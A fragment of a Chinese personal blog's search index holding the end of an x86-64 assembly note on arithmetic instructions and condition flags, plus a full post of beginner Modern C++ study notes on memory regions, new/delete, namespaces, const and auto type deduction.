<h5 id="2-一元操作和二元操作"><a href="#2-一元操作和二元操作" class="headerlink" title="2.一元操作和二元操作"></a>2.一元操作和二元操作</h5><p> 只有一个操作数的是一元操作，既是源操作数也是目的操作数<br>地址          值              寄存器       值<br>0x100      0xFF             rax        0x100<br>0x108      0xAB             rcx        0x1<br> 0x118  0x11           rdx        0x3<br><strong>subq</strong> %rax,%rdx rdx &#x3D; rdx -rax<br><strong>addq</strong> %rcx , (%rax)   ;更新的其实是一个内存位置 位置为0x100<br><strong>imulq</strong> $16,(%rax,%rdx,8) ;更新的内存位置是0x118，值对应的是0x11*16&#x3D;0x110<br>他们的目的和最终值写出来<br>imulq 有符号乘法 一个操作数 这个指令要求就是必须两个数都在寄存器rax中 把高64位存放在rdx，低64位存放在rax里面<br><strong>salq</strong> $4,%rax(左移4位，扩大了2的4次方倍)</p>
<h5 id="控制操作"><a href="#控制操作" class="headerlink" title="控制操作"></a>控制操作</h5><p>t  &#x3D; a + b<br>无符号溢出 <strong>CF</strong> （条件码）<br>  t&#x3D;&#x3D;0 <strong>ZF</strong><br> t &lt; 0  <strong>SF</strong><br> (a&lt;0&amp;&amp;b&lt;0) &amp;&amp; (t&lt;0 !&#x3D; a &lt;0) 有符号溢出 <strong>OF</strong><br><strong>leaq</strong> 不会改变任何条件码 xor 会将进位标志和溢出位标志设置成0<br><strong>cmpb</strong> 比较字节 <strong>cmpw</strong> 比较字  <strong>test</strong> 测试<br><strong>cmp</strong> rsi,rdi<br>cmp根据两个比较数的差来设置条件码 （除了不更新寄存器以外，和sub操作是一样的 test也是除了不更新寄存器以外，和 and 操作是一样的）<br><strong>testq</strong> %rax,%rax 检查rax是负数还是正数还是0<br> set指令设置条件码</p>
]]></content>
      <categories>
        <category>pwn基础</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>现代C++学习笔记（一）</title>
    <url>/2023/03/05/%E7%8E%B0%E4%BB%A3C++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="C-的基本特性"><a href="#C-的基本特性" class="headerlink" title="C++的基本特性"></a>C++的基本特性</h2><h3 id="程序的执行过程"><a href="#程序的执行过程" class="headerlink" title="程序的执行过程"></a>程序的执行过程</h3><p>程序被执行后就被称为一个进程，一个进程可以被划分为很多区域。</p>
<p>其中比较重要的是以下四个区域。</p>
<p><strong>1代码区与常量区：</strong>进程按照代码区的代码执行，真正的常量也存储在这里，比如“abc”字符串，“1”，“88”等数字。这些是真正的常量。再看一下const关键字。const只不过是让编译器将变量视为常量罢了，和真正的常量有本质上的区别</p>
<p><strong>2栈区：</strong>函数的执行所需的空间，注意，当函数执行完毕，函数对应的栈内存全部销毁。</p>
<p><strong>3堆区：</strong>进程用来分配内存的地方，只有手动释放才能销毁内存。</p>
<p><strong>4静态变量区：</strong></p>
<p>(1)静态变量：常常遇到的一些局部作用范围，生命周期却很长的变量。</p>
<p>(2)全局变量：在c++中不建议使用，会破坏封装性。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jangfan/picb@main/image-20230306163148843-1678164508218-1.png"></p>
<hr>
<p><strong>堆和栈的关系</strong></p>
<p>堆区有灵活的生命周期。如果需要创建的对象有几十M，每次调用函数都需要创建一个这么大的对象，再复制到对应的容器中，那就太过耗费内存了。而且栈内存非常的小，通常不超过8M。而使用堆内存，每调用一次函数就可以在堆内存中创建一个对象，容器中只要存储指针就可以了，极大的提高了程序效率。栈区是函数执行的区域，堆区是函数内灵活分配内存的地方，二者缺一不可。堆的唯一寻址方式就是指针，如果没有栈，根本无法使用堆。</p>
<hr>
<h3 id="new-关键字及内存泄漏"><a href="#new-关键字及内存泄漏" class="headerlink" title="(*) new 关键字及内存泄漏"></a>(*) new 关键字及内存泄漏</h3><p><strong>1.new关键字是c++用来动态分配内存的主要方式</strong>.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;isotream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span>* pi = <span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">100</span>);</span><br><span class="line">	std::cout &lt;&lt; *pi &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">delete</span> pi;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>new可以直接分配单个变量的内存，也可以分配数组。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">	<span class="type">int</span>* pi = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">100</span>]();<span class="comment">//小括号初始化为零，没有小括号分配未定义的内存，而且不可以赋初值</span></span><br><span class="line">	std::cout &lt;&lt; pi[<span class="number">20</span>] &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">delete</span>[] pi;<span class="comment">//不加中括号会导致动态内存泄露</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>在分配单个对象的内存时，</strong></p>
<p>当对象是普通变量时，可以分配对应的内存</p>
<p>当对象是类对象时，会调用构造函数，如果没有对应的构造函数，就会报错。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::string* pString = <span class="keyword">new</span> std::<span class="built_in">string</span>(<span class="string">&quot;hello world&quot;</span>);<span class="comment">//如果是字符串数组的话不能赋初值</span></span><br><span class="line">	std::cout &lt;&lt; *pString &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">delete</span> pString;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在分配数组对象内存时：</p>
<p>对于普通变量：可以使用“（）”将所有对象全部初始化为0。</p>
<p>对于类对象，有没有“（）”都一样，均使用默认构造函数，如果没有默认构造函数就会报错。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Test</span>(<span class="type">int</span> i_) :<span class="built_in">i</span>(i_)&#123;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">	Test* pTest = <span class="keyword">new</span> Test[<span class="number">100</span>];<span class="comment">//这是错误的,类Test不存在默认构造函数</span></span><br><span class="line">	<span class="keyword">delete</span>[] pTest;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2内存泄漏</strong></p>
<p>​	内存泄露会导致堆内存的逐渐被占用，最终内存用完程序崩溃。常见的情况就是项目测试没问题，上线几天就炸了。然后就会非常麻烦，排查困难，损失很大。</p>
<p><strong>内存泄露是最严重的错误之一，程序不怕报错，就怕一开始运行的好好的，突然就出现了莫名其妙的错误。</strong></p>
<p>这句话也引出了后面的两个部分。（期待学习hhh）</p>
<p><strong>Part4的智能指针</strong>可以非常好的避免内存泄露的问题。</p>
<p><strong>Part9的异常处理</strong>部分可以恰当的处理程序出现的异常，让程序有错误就立马处理，或直接终止进程，或忽略，不要让异常莫名其妙。这是程序设计的重要理念。</p>
<h3 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h3><p>C++经常需要多个团队合作来完成大型项目。多个团队就常常出现起名重复的问题，C++就提供了命名空间来解决这个问题。</p>
<p><strong>例子</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ATest.h</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">BTest.h</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">BTest.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BTest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;B::()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">ATest.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ATest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;A::()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">main.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;ATest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;BTest.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">test</span>();<span class="comment">//报错，不知道调用哪个test函数</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解决(使用命名空间)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ATest.h</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">namespace</span> A</span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BTest.h</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">namespace</span> B</span><br><span class="line">&#123;   </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BTest.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BTest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">namespace</span> B</span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;B::test()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ATest.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ATest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">namespace</span> A</span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;A::test()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;ATest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;BTest.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	B::<span class="built_in">test</span>();</span><br><span class="line">    A::<span class="built_in">test</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>顺便提两点</strong></p>
<p>命名空间的实现原理，C++最后都要转化为C来执行程序。在namespace A中定义的Test类，其实全名是A::Test。C++所有特有的库（指c没有的库）,都使用了std的命名空间。比如最常用的iostream。</p>
<p><strong>using关键字设计的目的之一就是为了简化命名空间的。using关键字在命名空间方面主要有两种用法。</strong></p>
<ol>
<li><p><strong>using 命名空间::变量名</strong>。这样以后使用此变量时只要使用变量名就可以了。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">main.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;ATest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;BTest.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> A::test;</span><br><span class="line"><span class="keyword">using</span> B::test;<span class="comment">//同时使用会报错</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">test</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
<li><p><strong>using namspce 命名空间</strong>。这样，每一个变量都会在该命名空间中寻找。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">main.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;ATest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;BTest.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> A;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> B;<span class="comment">//同时使用会报错</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">test</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>所以，头文件中一定不能使用using关键字。会导致命名空间的污染</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">错误代码</span><br><span class="line">ATest.h</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">namespace</span> A</span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> A;</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h3 id="C-的标准输入输出简介"><a href="#C-的标准输入输出简介" class="headerlink" title="(*)C++的标准输入输出简介"></a>(*)C++的标准输入输出简介</h3><p>输入输出简单来说就是数据在输入设备，内存，硬盘，输出设备之间移动的过程。</p>
<p>c语言设定了很多不相关的函数还实现这些过程。</p>
<p>比如printf就是让数据从内存到显示屏（显示屏就是输出设备）。scanf就是让数据从键盘（键盘是输入设备）到内存。此外还有从内存到磁盘的文件操作函数。</p>
<p> c语言的函数虽然简单方便，但彼此之间没有关联。C++有了继承功能，可以让子类与父类之间有关联性，极大的提高各种输入输出功能之间的耦合性。</p>
<p>于是C++用继承功能重写了输入输出功能，这就是io库，io库引入了“流”的概念，数据从一个地方到另一个地方，原本地方的数据就没了，叫做流很贴切。</p>
<p> io库是一个很大的部分，但现阶段我们只要会使用输入输出流，cout和cin就可以了。</p>
<p>cout可以让数据从内存流到输出设备，cin可以让数据从输入设备流到内存。</p>
<hr>
<h3 id="const关键字的介绍"><a href="#const关键字的介绍" class="headerlink" title="const关键字的介绍"></a>const关键字的介绍</h3><p>const是让编译器将变量视为常量，用const修饰的变量和真正的常量有本质的区别。</p>
<ol>
<li><p>真正的常量存储在<strong>常量区</strong>或<strong>代码区</strong>，比如“abcdefg”这个字符串就存储在常量区，而“3”，“100”这些数字就存储在代码区中，这些都是真正的常量，<strong>无法用任何方式修改。</strong></p>
</li>
<li><p>const修饰的变量仍然存储在<strong>堆区</strong>或<strong>栈区</strong>中，<strong>从内存分布的角度讲，和普通变量没有区别。</strong>const修饰的变量并非不可更改的，C++本身就提供了mutable关键字（这个关键字在Part3就会讲的）用来修改const修饰的变量，从汇编的角度讲，const修饰的变量也是可以修改的。</p>
</li>
</ol>
<hr>
<h3 id="auto关键词的使用"><a href="#auto关键词的使用" class="headerlink" title="(**)auto关键词的使用"></a>(**)auto关键词的使用</h3><p>auto是C++11新加入的关键字，就是为了简化一些写法。</p>
<p>为了学习auto的类型推断，我使用一个boost库来确定变量的具体类型。boost库很大，可以选择编译自己想要的模块，我就直接全部编译了。boost是很复杂的，不是几句话能说清楚，要深入理解可以去官网学习。</p>
<p>演示</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">auto</span> i = <span class="number">100</span>;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(i)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>来说一下auto，有好几个点需要注意：</strong></p>
<p>**1.**auto只能推断出类型，引用不是类型，所以auto无法推断出引用，要使用引用只能自己加引用符号。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="keyword">auto</span>&amp; i2 = i;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(i2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//输出类型int &amp;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**2.**auto关键字在推断引用的类型时：会直接将引用替换为引用指向的对象。其实引用一直是这样的，引用不是对象，任何使用引用的地方都可以直接替换成引用指向的对象。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span>&amp; refi = i;</span><br><span class="line">	<span class="keyword">auto</span>&amp; i2 = i;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(i2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//int &amp;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3.<strong>auto关键字在推断类型时，如果没有引用符号，会忽略值类型的const修饰，而保留修饰指向对象的const，典型的就是指针。</strong>可能有些不好理解，看看代码就好说了。3和4的主要作用对象就是指针.</strong></p>
<p>例子1</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span>* <span class="type">const</span> pi = &amp;i;<span class="comment">//前者const修饰的是指针pi修饰的值，后者const修饰的是pi，后者const会被忽略</span></span><br><span class="line">	<span class="keyword">auto</span> pi2 = pi;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(pi2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//int const *=const int *</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例子2</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="keyword">auto</span> i2 = i;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(i2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//int</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>**4.**auto关键字在推断类型时，如果有了引用符号，那么值类型的const和修饰指向对象的const都会保留。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span>* <span class="type">const</span> pi = &amp;i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">auto</span>&amp; pi2 = pi;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(pi2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//int const * const &amp;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="keyword">auto</span>&amp; i2 = i;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(i2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//int const &amp;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>其实3，4为什么会出现这种情况，因为在传递值时，修改这个值并不会对原有的值造成影响。而传递引用时，修改这个值会直接对原有的值造成影响。</strong></p>
<p>**5.**当然，我们可以在前面加上const，这样永远都有const的含义。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;boost/type_index.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> boost::typeindex::type_id_with_cvr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">	<span class="type">const</span> <span class="keyword">auto</span> i2 = i;</span><br><span class="line">	std:: cout &lt;&lt; <span class="built_in">type_id_with_cvr</span>&lt;<span class="keyword">decltype</span>(i2)&gt;().<span class="built_in">pretty_name</span>() &lt;&lt; std::endl;<span class="comment">//int const </span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>auto不会影响编译速度，甚至会加快编译速度。因为编译器在处理XX a &#x3D; b时，当XX是传统类型时，编译期需要检查b的类型是否可以转化为XX。当XX为auto时，编译期可以按照b的类型直接给定变量a的类型，所以效率相差不大，甚至反而还有提升。</li>
<li>（*）最重要的一点，就是auto不要滥用，对于一些自己不明确的地方不要乱用auto，否则很可能出现事与愿违的结果，使用类型应该安全为先。</li>
<li>（*）auto主要用在与模板相关的代码中，一些简单的变量使用模板常常导致可读性下降，经验不足还会导致安全性问题。</li>
</ol>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>c++</tag>
      </tags>
  </entry>
</search>
